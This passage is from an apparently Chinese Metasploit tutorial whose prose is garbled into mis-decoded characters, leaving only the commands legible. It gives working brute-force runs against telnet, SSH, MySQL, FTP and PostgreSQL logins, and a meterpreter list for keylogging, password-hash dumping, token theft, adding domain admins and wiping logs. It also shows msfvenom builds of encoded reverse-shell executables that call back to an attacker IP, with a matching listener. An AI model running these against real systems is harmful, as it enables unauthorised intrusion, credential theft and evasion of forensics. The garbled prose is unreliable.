extensionï¼‰ï¼š**æ˜¯æ•´ä¸ªæ¡†æ¶æ‰€ä¾èµ–çš„æœ€åŸºç¡€çš„ä¸€äº›ç»„ä»¶ï¼Œä¸ºå¼€å‘è€…è¿›è¡Œæ¡†æ¶å’Œæ¨¡å—å¼€å‘æä¾›äº†ä¸€äº›åŸºç¡€åŠŸèƒ½çš„æ”¯æŒï¼Œå¦‚åŒ…è£…çš„ç½‘ç»œå¥—æ¥å­—ã€ç½‘ç»œåº”ç”¨åè®®å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å®ç°ã€æ—¥å¿—å­ç³»ç»Ÿã€æ¸—é€æ”»å‡»æ”¯æŒä¾‹ç¨‹ã€PostgreSQLä»¥åŠMySQLæ•°æ®åº“æ”¯æŒç­‰ï¼›\n- **framework-coreï¼š** è´Ÿè´£å®ç°æ‰€æœ‰ä¸å„ç§ç±»å‹çš„ä¸Šå±‚æ¨¡å—åŠæ’ä»¶çš„äº¤äº’æ¥å£ï¼›\n- **framework-baseï¼š** æ‰©å±•äº†framework-coreï¼Œæä¾›æ›´åŠ ç®€å•çš„åŒ…è£…ä¾‹ç¨‹ï¼Œå¹¶ä¸ºå¤„ç†æ¡†æ¶å„ä¸ªæ–¹é¢çš„åŠŸèƒ½æä¾›äº†ä¸€äº›åŠŸèƒ½ç±»ï¼Œç”¨äºæ”¯æŒç”¨æˆ·æ¥å£ä¸åŠŸèƒ½ç¨‹åºè°ƒç”¨æ¡†æ¶æœ¬èº«åŠŸèƒ½åŠæ¡†æ¶é›†æˆæ¨¡å—ï¼›\n\n### **æ¨¡å—**\n\n> æ¨¡å—æ˜¯é€šè¿‡Metasploitæ¡†æ¶æ‰€è£…è½½ã€é›†æˆå¹¶å¯¹å¤–æä¾›çš„æœ€æ ¸å¿ƒçš„æ¸—é€æµ‹è¯•åŠŸèƒ½å®ç°ä»£ç ã€‚åˆ†ä¸º`è¾…åŠ©æ¨¡å—(Aux)`ã€`æ¸—é€æ”»å‡»æ¨¡å—(Exploits)`ã€`åæ¸—é€æ”»å‡»æ¨¡å—(Post)`ã€`æ”»å‡»è½½è·æ¨¡å—(payloads)`ã€`ç¼–ç å™¨æ¨¡å—(Encoders)`ã€`ç©ºæŒ‡ä»¤æ¨¡å—(Nops)`ã€‚è¿™äº›æ¨¡å—æ‹¥æœ‰éå¸¸æ¸…æ™°çš„ç»“æ„å’Œä¸€ä¸ªé¢„å®šä¹‰å¥½çš„æ¥å£ï¼Œå¹¶å¯ä»¥ç»„åˆæ”¯æŒä¿¡æ¯æ”¶é›†ã€æ¸—é€æ”»å‡»ä¸åæ¸—é€æ”»å‡»æ‹“å±•ã€‚\n\n- **è¾…åŠ©æ¨¡å—(Aux)ï¼š**ã€€åœ¨æ¸—é€ä¿¡æ¯æœé›†ç¯èŠ‚æä¾›äº†å¤§é‡çš„è¾…åŠ©æ¨¡å—æ”¯æŒï¼ŒåŒ…æ‹¬é’ˆå¯¹å„ç§ç½‘ç»œæœåŠ¡çš„æ‰«æä¸æŸ¥ç‚¹ã€æ„å»ºè™šå‡æœåŠ¡æ”¶é›†ç™»å½•å¯†ç ã€å£ä»¤çŒœæµ‹ç­‰æ¨¡å—ã€‚\n\n- **æ¸—é€æ”»å‡»æ¨¡å—(Exploits)ï¼š**åˆ©ç”¨å‘ç°çš„å®‰å…¨æ¼æ´å’Œé…ç½®å¼±ç‚¹å¯¹è¿œç¨‹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ”»å‡»ï¼Œæ¤å…¥è¿è¡Œæ”»å‡»è½½è·ï¼Œä»è€Œè·å¾—å¯¹è¿œç¨‹ç›®æ ‡ç³»ç»Ÿè®¿é—®æƒçš„ä»£ç ç»„ä»¶ã€‚\n\n- **æ”»å‡»è½½è·æ¨¡å—(payloads)ï¼š**åœ¨æ¸—é€æ”»å‡»æˆåŠŸåä¿ƒä½¿ç›®æ ‡ç³»ç»Ÿè¿è¡Œçš„ä¸€æ®µæ¤å…¥ä»£ç ï¼Œé€šå¸¸ä½œç”¨æ˜¯ä¸ºæ¸—é€æ”»å‡»è€…æ‰“å¼€åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ§åˆ¶ä¼šè¯è¿æ¥ã€‚\n- **ç©ºæŒ‡ä»¤æ¨¡å—(Nops)ï¼š**ç”¨æ¥åœ¨æ”»å‡»è½½è·ä¸­æ·»åŠ ç©ºæŒ‡ä»¤åŒºï¼Œ ä»¥æé«˜æ”»å‡»å¯é æ€§çš„ç»„ä»¶ã€‚\n\n- **ç¼–ç å™¨æ¨¡å—(Encoders)ï¼š**æ”»å‡»è½½è·ä¸ç©ºæŒ‡ä»¤æ¨¡å—ç»„è£…å®Œæˆä¸€ä¸ªæŒ‡ä»¤åºåˆ—åï¼Œè¿›è¡Œç¼–ç ï¼Œæ¥ç»•è¿‡é˜²æŠ¤è½¯ä»¶æ‹¦æˆªã€‚\n\n- **åæ¸—é€æ”»å‡»æ¨¡å—(Post)ï¼š**åœ¨æ¸—é€æ”»å‡»å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒä¹‹åï¼Œåœ¨å—æ§ç³»ç»Ÿä¸­è¿›è¡Œå„ç§å„æ ·çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œæ¯”å¦‚è·å–æ•æ„Ÿä¿¡æ¯ï¼Œè¿›ä¸€æ­¥æ‹¬å±•ï¼Œå®æ–½è·³æ¿æ”»å‡»ç­‰ã€‚\n- **èº²é¿æ¨¡å—(Evasion)ï¼š**5.0æ–°å¢çš„æ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—å¯ä»¥è½»æ¾çš„åˆ›å»ºåæ€æ¯’è½¯ä»¶çš„æœ¨é©¬ã€‚\n\n### **æ’ä»¶**\n\nã€€ã€€æ’ä»¶èƒ½å¤Ÿæ‰©å……æ¡†æ¶çš„åŠŸèƒ½ï¼Œæˆ–è€…ç»„è£…å·²æœ‰åŠŸèƒ½æ„æˆé«˜çº§ç‰¹æ€§çš„ç»„ä»¶ã€‚æ’ä»¶å¯ä»¥é›†æˆç°æœ‰çš„ä¸€äº›å¤–éƒ¨å®‰å…¨å·¥å…·ï¼Œå¦‚ Nessusã€OpenVAS æ¼æ´æ‰«æå™¨ç­‰ï¼Œä¸ºç”¨æˆ·æ¥å£æä¾›ä¸€äº›æ–°çš„åŠŸèƒ½ã€‚\n\n### **æ¥å£**\n\nã€€ã€€åŒ…æ‹¬ msfconsole æ§åˆ¶ç»ˆç«¯ã€msfcli å‘½ä»¤è¡Œã€msfgui å›¾å½¢åŒ–ç•Œé¢ã€armitage å›¾å½¢åŒ–ç•Œé¢ä»¥åŠ msfapi è¿œç¨‹è°ƒç”¨æ¥å£ç­‰ã€‚\n\n### **åŠŸèƒ½ç¨‹åº**\n\nã€€ã€€é™¤äº†ç”¨æˆ·ä½¿ç”¨ç”¨æˆ·æ¥å£è®¿é—® metasploit æ¡†æ¶ä¸»ä½“åŠŸèƒ½ä¹‹å¤–ï¼Œmetasploit è¿˜æä¾›äº†ä¸€ç³»åˆ—å¯ç›´æ¥è¿è¡Œçš„åŠŸèƒ½ç¨‹åºï¼Œæ”¯æŒæ¸—é€æµ‹è¯•è€…ä¸å®‰å…¨äººå‘˜å¿«é€Ÿåœ°åˆ©ç”¨ metasploit æ¡†æ¶å†…éƒ¨èƒ½åŠ›å®Œæˆä¸€äº›ç‰¹å®šä»»åŠ¡ã€‚æ¯”å¦‚ `msfpayload`ã€`msfencode` å’Œ `msfvenom` å¯ä»¥å°†æ”»å‡»è½½è·å°è£…ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€Cè¯­è¨€ã€JavaScriptè¯­è¨€ç­‰å¤šç§å½¢å¼ï¼Œå¹¶å¯ä»¥è¿›è¡Œå„ç§ç±»å‹çš„ç¼–ç ã€‚`msf*scan`ç³»åˆ—åŠŸèƒ½ç¨‹åºæä¾›äº†åœ¨PEã€ELFç­‰å„ç§ç±»å‹æ–‡ä»¶ä¸­æœç´¢ç‰¹å®šæŒ‡ä»¤çš„åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€ä»£ç å¼€å‘äººå‘˜å®šä½æŒ‡ä»¤åœ°å€ã€‚\n\n## Metasploitç›®å½•ç»“æ„\n\nç›®å½•åœ°å€ï¼š`/usr/share/metasploit-framework/`\n\næœ€é‡è¦çš„ç›®å½•æ˜¯dataï¼Œmodulesï¼Œscriptsï¼Œtoolsï¼Œplugins\n\n![ä¸»ç›®å½•](https://img.jwt1399.top//img/20200812115104.png)\n\n### dataç›®å½•\n\nå­˜æ”¾meterpreterï¼Œexploitsï¼Œwordlistsç­‰ã€‚\n\n![dataç›®å½•](https://img.jwt1399.top//img/20200812115104.png)\n\n**meterpreter**æ˜¯msfçš„æ”»å‡»è½½è·ï¼Œä½¿ç”¨äºåæ¸—é€é˜¶æ®µ\n\n**exploits**é‡Œé¢åˆ™å­˜æ”¾äº†è®¸å¤šçš„cveæ¼æ´åˆ©ç”¨ä»£ç \n\n**wordlists**é‡Œé¢æ”¾çš„æ˜¯å­—å…¸æ–‡ä»¶\n\n### modulesç›®å½•\n\nmetasploitçš„æ ¸å¿ƒç›®å½•äº†ï¼Œå­˜æ”¾ç€å„ä¸ªæ”»å‡»æ¨¡å—\n\n![modulesç›®å½•](https://img.jwt1399.top//img/20200812115053.png)\n\n### scirptsç›®å½•\n\nå­˜æ”¾ä¸€äº›msfç”¨åˆ°çš„è„šæœ¬æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯meterpreterï¼Œpsï¼Œresourceï¼Œshell\n\n![scirptsç›®å½•](https://img.jwt1399.top//img/20200812115348.png)\n\n### toolsç›®å½•\n\nå­˜æ”¾å„ç§å¯ä½¿ç”¨çš„å·¥å…·\n\n![toolsç›®å½•](https://img.jwt1399.top//img/20200812164726.png)\n\n### pluginsç›®å½•\n\nå­˜æ”¾msfçš„å„ç§æ’ä»¶\n\n![pluginsç›®å½•](https://img.jwt1399.top//img/20200812164729.png)\n\n## Metasploitå‘½ä»¤ç¯‡\n\n### **MSFå¯åŠ¨**\n\næ–¹æ³•ä¸€ï¼š\n\n```bash\nsudo msfdb init && msfconsole\n```\n\næ–¹æ³•äºŒï¼š\n\n- 1.å¼€å¯æ•°æ®åº“ï¼šservice start postgresql \n\n- 2.è®¾ç½®æ•°æ®åº“å¼€æœºå¯åŠ¨ï¼šservice enable postgresql \n\n- 3.åˆå§‹åŒ–MSFæ•°æ®åº“ï¼šmsfdb initã€€ã€€ã€€ã€€[åˆæ¬¡ä½¿ç”¨éœ€è¦åˆå§‹åŒ–]\n\n- 4.å¼€å¯MSFï¼šmsfconsole\n\n- 5.æŸ¥çœ‹æ•°æ®åº“è¿æ¥çŠ¶æ€ï¼šdb_status\n\nå¯åŠ¨å®Œæˆåä¼šæœ‰ä¸€äº›ç»Ÿè®¡ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ç‰ˆæœ¬å·ï¼Œæœ‰å¤šå°‘ä¸ª exploitsï¼Œå¤šå°‘ä¸ª payloads ç­‰ã€‚\n\n![](https://img.jwt1399.top//img/20200812171940.png)\n\n### å¸¸ç”¨å‘½ä»¤\n\né€šè¿‡ `help` æŸ¥çœ‹å¸®åŠ©ï¼Œå¯ä»¥å¯¹ msf æœ‰ä¸ªæ•´ä½“è®¤è¯†ï¼Œå¯ä»¥çœ‹åˆ° msf ç›¸å…³å‘½ä»¤å¯ä»¥åˆ†æˆä»¥ä¸‹ç±»å‹ï¼š\n\n| Core Commands                | æ ¸å¿ƒå‘½ä»¤          |\n| ---------------------------- | ----------------- |\n| Module Commands              | æ¨¡å—å‘½ä»¤          |\n| Job Commands                 | åå°ä»»åŠ¡å‘½ä»¤      |\n| Resource Script Commands     | èµ„æºè„šæœ¬å‘½ä»¤      |\n| Database Backend Commands    | æ•°æ®åº“åç«¯å‘½ä»¤    |\n| Credentials Backend Commands | è¯ä¹¦/å‡­è¯åç«¯å‘½ä»¤ |\n| Developer Commands           | å¼€å‘äººå‘˜å‘½ä»¤      |\n\n å¾…æ›´ã€‚ã€‚ã€‚\n\n## Metasploitçˆ†ç ´ç¯‡\n\n### çˆ†ç ´TELNET\n\n```bash\nmsf > use auxiliary/scanner/telnet/telnet_login \nmsf auxiliary(telnet_login) > set RHOSTS 192.168.1.103\nmsf auxiliary(telnet_login) > set STOP_ON_SUCCESS true #çˆ†ç ´æˆåŠŸå°±åœæ­¢\nmsf auxiliary(telnet_login) > set VERBOSE true #æ‰“å°è¾“å‡º\nmsf auxiliary(telnet_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(telnet_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(telnet_login) > exploit \n```\n\n### çˆ†ç ´SSH\n\n```bash\nmsf > use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) > set RHOSTS 192.168.1.103\nmsf auxiliary(ssh_login) > set STOP_ON_SUCCESS true #çˆ†ç ´æˆåŠŸå°±åœæ­¢\nmsf auxiliary(ssh_login) > set VERBOSE true #æ‰“å°è¾“å‡º\nmsf auxiliary(ssh_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(ssh_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(ssh_login) > set THREADS 50\nmsf auxiliary(ssh_login) > run\n```\n\n### çˆ†ç ´MYSQL\n\n```bash\nmsf > use  auxiliary/scanner/mysql/mysql_login\nmsf auxiliary(mysql_login) > set RHOSTS  192.168.1.103\nmsf auxiliary(mysql_login) > set STOP_ON_SUCCESS true #çˆ†ç ´æˆåŠŸå°±åœæ­¢\nmsf auxiliary(mysql_login) > set VERBOSE true #æ‰“å°è¾“å‡º\nmsf auxiliary(mysql_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(mysql_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(mysql_login) > run\n```\n\n### çˆ†ç ´FTP\n\n```bash\nmsf > use auxiliary/scanner/ftp/ftp_login\nmsf auxiliary(ftp_login) > set RHOSTS  192.168.1.103\nmsf auxiliary(ftp_login) > set STOP_ON_SUCCESS true #çˆ†ç ´æˆåŠŸå°±åœæ­¢\nmsf auxiliary(ftp_login) > set VERBOSE true #æ‰“å°è¾“å‡º\nmsf auxiliary(ftp_login) > set USERNAME msfadmin\nmsf auxiliary(ftp_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(ftp_login) > run\n```\n\n### çˆ†ç ´postgressqlæ•°æ®åº“\n\n```bash\nmsf > use auxiliary/scanner/postgres/postgres_login  \nmsf auxiliary(postgres_login) > set RHOSTS  192.168.1.103\nmsf auxiliary(postgres_login) > set STOP_ON_SUCCESS true #çˆ†ç ´æˆåŠŸå°±åœæ­¢\nmsf auxiliary(postgres_login) > set VERBOSE true #æ‰“å°è¾“å‡º\nmsf auxiliary(postgres_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(postgres_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(postgres_login) > run\n```\n\n## meterpreter\n\n### å¸¸ç”¨å‘½ä»¤\n\n```bash\nã€€run scriptname       è¿è¡ŒMeterpreterè„šæœ¬ï¼Œåœ¨scripts/meterpreterç›®å½•ä¸‹å¯æŸ¥çœ‹æ‰€æœ‰çš„è„šæœ¬åã€‚\n  sysinfo                    åˆ—å‡ºå—æ§ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€‚\n  ls                             åˆ—å‡ºç›®æ ‡ä¸»æœºçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä¿¡æ¯ã€‚\n  use priv                    åŠ è½½ç‰¹æƒæå‡æ‰©å±•æ¨¡å—ï¼Œæ¥æ‰©å±•Meterpreteråº“ã€‚\n  ps                            æ˜¾ç¤ºæ‰€æœ‰è¿è¡Œè¿›ç¨‹ä»¥åŠå…³è”çš„ç”¨æˆ·è´¦å·ã€‚\n  migrate PID               è¿ç§»åˆ°ä¸€ä¸ªæŒ‡å®šçš„è¿›ç¨‹ID(PIDå¯é€šè¿‡psä»ç›®æ ‡ä¸»æœºä¸Šè·å¾—ï¼‰ã€‚\n  use incognito             åŠ è½½incognitoåŠŸèƒ½ï¼ˆç”¨æ¥ç›—çªƒç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–æ˜¯å‡å†’ç”¨æˆ·).\n  list_tokens -u            åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œã€‚\n  list_tokens -g            åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·ç»„çš„å¯ç”¨ä»¤ç‰Œã€‚\n  impersonate_token DOMAIN_NAME\\\\USERNAME             å‡å†’ç›®æ ‡ä¸»æœºä¸Šçš„å¯ç”¨ä»¤ç‰Œã€‚\n  steal_token PID          ç›—çªƒç»™å®šè¿›ç¨‹çš„å¯ç”¨ä»¤ç‰Œå¹¶è¿›è¡Œä»¤ç‰Œå‡å†’ã€‚\n  drop_token                åœæ­¢å‡å†’å½“å‰ä»¤ç‰Œã€‚\n  getsystem                  é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™ã€‚\n  shell                          ä»¥æ‰€æœ‰å¯ç”¨ä»¤ç‰Œæ¥è¿è¡Œä¸€ä¸ªäº¤äº’çš„shellã€‚\n  execute -f cmd.exe -i  æ‰§è¡Œcmd.exeå‘½ä»¤å¹¶è¿›è¡Œäº¤äº’ã€‚\n execute -f cmd.exe -i -t ä»¥æ‰€æœ‰å¯ç”¨çš„ä»¤ç‰Œæ¥æ‰§è¡Œcmdå‘½ä»¤ã€‚\n  execute -f cmd.exe -i -H -t  ä»¥æ‰€æœ‰å¯ç”¨çš„ä»¤ç‰Œæ¥æ‰§è¡Œcmdå‘½ä»¤å¹¶éšè—è¯¥è¿›ç¨‹ã€‚\n  rev2self                      å›åˆ°æ§åˆ¶ç›®æ ‡ä¸»æœºçš„åˆå§‹åŒ–ç”¨æˆ·è´¦å·ä¸‹ã€‚\n  reg command              åœ¨ç›®æ ‡ä¸»æœºæ³¨å†Œè¡¨ä¸­è¿›è¡Œäº¤äº’ï¼Œåˆ›å»ºï¼Œåˆ é™¤ï¼ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚\n  setdesktop number      åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼ˆè¯¥åŠŸèƒ½åŸºäºå“ªäº›ç”¨æˆ·å·²ç™»å½•ï¼‰ã€‚\n  screenshot                  å¯¹ç›®æ ‡ä¸»æœºçš„å±å¹•è¿›è¡Œæˆªå›¾ã€‚\n  upload file                   å‘ç›®æ ‡ä¸»æœºä¸Šä¼ æ–‡ä»¶\n  download file               ä»ç›®æ ‡ä¸»æœºä¸‹è½½æ–‡ä»¶ã€‚\n  keyscan_start             é’ˆå¯¹è¿œç¨‹ç›®æ ‡ä¸»æœºå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ã€‚\n  keyscan_dump            å­˜å‚¨ç›®æ ‡ä¸»æœºä¸Šæ•è·çš„é”®ç›˜è®°å½•ã€‚\n  keyscan_stop              åœæ­¢é’ˆå¯¹ç›®æ ‡ä¸»æœºçš„é”®ç›˜è®°å½•åŠŸèƒ½ã€‚\n  getprivs                      å°½å¯èƒ½å¤šçš„è·å–ç›®æ ‡ä¸»æœºä¸Šçš„ç‰¹æƒã€‚\n  uictl enable keyboard/mouse     æ¥ç®¡ç›®æ ‡ä¸»æœºçš„é”®ç›˜å’Œé¼ æ ‡ã€‚\n  background                 å°†ä½ å½“å‰çš„Meterpreter shellè½¬ä¸ºåå°æ‰§è¡Œã€‚\n  hashdump                   å¯¼å‡ºç›®æ ‡ä¸»æœºä¸­çš„å£ä»¤å“ˆå¸Œå€¼ã€‚\n  use sniffer                   åŠ è½½å—…æ¢æ¨¡å—ã€‚\n  sniffer_interfaces          åˆ—å‡ºç›®æ ‡ä¸»æœºæ‰€æœ‰å¼€æ”¾çš„ç½‘ç»œæ¥å£ã€‚\n  sniffer_dump interfaceID pcapname        åœ¨ç›®æ ‡ä¸»æœºä¸Šå¯åŠ¨å—…æ¢ã€‚\n  sniffer_stats interfaceID  è·å–æ­£åœ¨å®æ–½å—…æ¢ç½‘ç»œæ¥å£çš„ç»Ÿè®¡æ•°æ®ã€‚\n  sniffer_start interfaceID packet-buffer  åœ¨ç›®æ ‡ä¸»æœºä¸Šé’ˆå¯¹ç‰¹å®šèŒƒå›´çš„æ•°æ®åŒ…ç¼“å†²åŒºå¯åŠ¨å—…æ¢ã€‚\n  sniffer_stop interfaceID åœæ­¢å—…æ¢ã€‚\n  add_user username password -h ip   åœ¨è¿œç¨‹ç›®æ ‡ä¸»æœºä¸Šæ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚\n  add_group_user \"Domain Admins\" username -h ip     å°†ç”¨æˆ·æ·»åŠ åˆ°ç›®æ ‡ä¸»æœºçš„åŸŸç®¡ç†å‘˜ç»„ä¸­ã€‚\n  clearev                        æ¸…é™¤ç›®æ ‡ä¸»æœºä¸Šçš„æ—¥å¿—è®°å½•ã€‚\n  timestomp                   ä¿®æ”¹æ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚ä¿®æ”¹æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ï¼ˆåå–è¯è°ƒæŸ¥ï¼‰ã€‚\n  reboot                         é‡å¯ç›®æ ‡ä¸»æœºã€‚\n```\n\n### meterpreterä¸­æ–‡ä¹±ç \n\n#### æˆå› \n\nLinuxä¸‹é¢æ±‰å­—é»˜è®¤æ˜¯UTF-8ç¼–ç \nWindowsä¸‹æ±‰å­—ä½¿ç”¨çš„æ˜¯GBKç³»åˆ—ç¼–ç \n\n#### è§£å†³æ–¹æ¡ˆ\n\næ–¹æ³•ä¸€ï¼šç›´æ¥æ‰§è¡Œ `chcp 65001` å‘½ä»¤\n\næ–¹æ³•äºŒï¼šå°†ç»ˆç«¯ä¸´æ—¶è®¾ç½®ä¸º`GBK`ç³»åˆ—ç¼–ç å³å¯\n\n## msfvenom\n\n> **msfvenom **æ˜¯ `msfpayload` å’Œ `msfencode` çš„ç»“åˆä½“ï¼Œå¯åˆ©ç”¨ msfvenom ç”Ÿæˆæœ¨é©¬ç¨‹åº,å¹¶åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œ,åœ¨æœ¬åœ°ç›‘å¬ä¸Šçº¿\n\n### msfvenomå‚æ•°\n\næŸ¥çœ‹å¸®åŠ©å‚æ•°çš„å‘½ä»¤`msfvenom -h`\n\n```bash\nOptions:\n    -l, --list            <type>        # åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„é¡¹ç›®ï¼Œå…¶ä¸­å€¼å¯ä»¥è¢«è®¾ç½®ä¸º payloads, encoders, nops, platforms, archs, encrypt, formatsç­‰ç­‰\n    -p, --payload         <payload>     # æŒ‡å®šç‰¹å®šçš„ Payloadï¼Œå¦‚æœè¢«è®¾ç½®ä¸º - ï¼Œé‚£ä¹ˆä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–\n        --list-options                  # åˆ—å‡º--payload <value> çš„æ ‡å‡†ï¼Œé«˜çº§å’Œè§„é¿é€‰é¡¹\n    -f, --format          <format>      # æŒ‡å®š Payload çš„è¾“å‡ºæ ¼å¼(ä½¿ç”¨ --list formats åˆ—å‡º)\n    -e, --encoder         <encoder>     # æŒ‡å®šä½¿ç”¨çš„ Encoder (ä½¿ç”¨ --list encoders åˆ—å‡º)\n        --sec-name        <value>       # ç”Ÿæˆå¤§å‹WindowsäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ–°åç§°ã€‚é»˜è®¤å€¼ï¼šéšæœº4ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²\n        --smallest                      # ä½¿ç”¨æ‰€æœ‰å¯ç”¨çš„ç¼–ç å™¨ç”Ÿæˆæœ€å°çš„payload\n        --encrypt         <value>       # åº”ç”¨äºshellcodeçš„åŠ å¯†æˆ–ç¼–ç ç±»å‹ (ä½¿ç”¨--list encrypt åˆ—å‡º)\n        --encrypt-key     <value>       # ç”¨äºåŠ å¯†çš„å¯†é’¥\n        --encrypt-iv      <value>       # åŠ å¯†çš„åˆå§‹åŒ–å‘é‡\n    -a, --arch            <arch>        # æŒ‡å®šç›®æ ‡ç³»ç»Ÿæ¶æ„(ä½¿ç”¨ --list archs  åˆ—å‡º)\n        --platform        <platform>    # æŒ‡å®šç›®æ ‡ç³»ç»Ÿå¹³å° (ä½¿ç”¨ --list platforms åˆ—å‡º)\n    -o, --out             <path>        # ä¿å­˜payloadåˆ°æ–‡ä»¶\n    -b, --bad-chars       <list>        # è®¾ç½®éœ€è¦åœ¨ Payload ä¸­é¿å…å‡ºç°çš„å­—ç¬¦ï¼Œå¦‚ï¼š '\\x00\\xff'\n    -n, --nopsled         <length>      # æŒ‡å®š nop åœ¨ payload ä¸­çš„æ•°é‡\n    -s, --space           <length>      # è®¾ç½®æœªç»ç¼–ç çš„ Payload çš„æœ€å¤§é•¿åº¦\n        --encoder-space   <length>      # ç¼–ç åçš„ Payload çš„æœ€å¤§é•¿åº¦\n    -i, --iterations      <count>       # è®¾ç½® Payload çš„ç¼–ç æ¬¡æ•°\n    -c, --add-code        <path>        # æŒ‡å®šåŒ…å«ä¸€ä¸ªé¢å¤–çš„win32 shellcodeæ–‡ä»¶\n    -x, --template        <path>        # æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿\n    -k, --keep                          # ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠŸèƒ½ï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ\n    -v, --var-name        <value>       # æŒ‡å®šä¸€ä¸ªå˜é‡åï¼ˆå½“æ·»åŠ  -f å‚æ•°çš„æ—¶å€™ï¼Œä¾‹å¦‚ -f pythonï¼Œé‚£ä¹ˆè¾“å‡ºä¸º python ä»£ç ï¼Œ payload ä¼šè¢«æŒ‰è¡Œæ ¼å¼åŒ–ä¸º python ä»£ç ï¼Œè¿½åŠ åˆ°ä¸€ä¸ª python å˜é‡ä¸­ï¼Œè¿™ä¸ªå‚æ•°å³ä¸ºæŒ‡å®š python å˜é‡çš„å˜é‡åï¼‰\n    -t, --timeout         <second>      # è®¾ç½®ä»STDINè¯»å–payloadçš„ç­‰å¾…æ—¶é—´ï¼ˆé»˜è®¤ä¸º30,0ä¸ºç¦ç”¨ï¼‰\n    -h, --help                          # å¸®åŠ©\n```\n\n### msfvenomç”ŸæˆPayload\n\n```bash\n#æ™®é€šç”Ÿæˆ\nmsfvenom -p <payload> <payload options> -f <format> -o <path>\nmsfvenom -p windows/meterpreter/reverse_tcp  -f exe -o payload.exe\n\n#ç¼–ç ç”Ÿæˆ\nmsfvenom -a ç³»ç»Ÿæ¶æ„ --platform ç³»ç»Ÿå¹³å° -p æœ‰æ•ˆè½½è· lhost=æ”»å‡»æœºIP lport=æ”»å‡»æœºç«¯å£ -e ç¼–ç æ–¹å¼  -i ç¼–ç æ¬¡æ•° -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=12345 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe\n```\n\n```bash\nmsfvenom -l archs\t\t#æŸ¥çœ‹æ”¯æŒçš„ç³»ç»Ÿæ¶æ„\nmsfvenom -l platforms\t#æŸ¥çœ‹æ”¯æŒç³»ç»Ÿå¹³å°\nmsfvenom -l payload    \t\t#åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„payload\nmsfvenom -l formats    \t\t#åˆ—å‡ºæ‰€æœ‰çš„è¾“å‡ºæ ¼å¼\nmsfvenom -l encrypt    \t\t#åˆ—å‡ºæ‰€æœ‰çš„åŠ å¯†æ–¹å¼\nmsfvenom -l encoders   \t\t#åˆ—å‡ºæ‰€æœ‰çš„ç¼–ç å™¨\n```\n\n### åˆ›å»ºç›‘å¬å™¨\n\nç­‰å¾…shellå›è¿,åŠ¡å¿…æ³¨æ„,åˆ›å»ºä»€ä¹ˆç±»å‹çš„payloadå°±è¦ç”¨ä»€ä¹ˆç±»å‹çš„ç›‘å¬å™¨æ¥æ¥æ”¶,å¿…é¡»ä¸€ä¸€å¯¹åº”,æ­¤å¤„å°±ä»¥æœ€æ™®é€šçš„tcpç›‘å¬å™¨ä¸ºä¾‹\n\n```bash\nmsf > use exploit/multi/handler\nmsf > set payload windows/meterpreter/reverse_tcp\nmsf > set lport 12345   #ä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„4444ç«¯å£\nmsf > set lhost 192.168.1.101\nmsf > exploit\n```\n\n### å„ç±»OSç³»ç»Ÿçš„payload\n\n#### windows å¹³å°\n\næ™®é€šçš„exe ç›´æ¥åŒå‡»å³å¯è§¦å‘,ä¼šå¼¹å›ä¸€ä¸ªå¸¸è§„meterpreter\n\n```bash\nmsfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.52.128 LPORT=12345 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o x86_shell.exe\n```\n\npowershellï¼ŒæŠŠæ–‡ä»¶ä¸­ç¼–ç åçš„powershell payloadä»£ç ç›´æ¥æŠ å‡ºæ¥,ä¸¢åˆ°ç›®æ 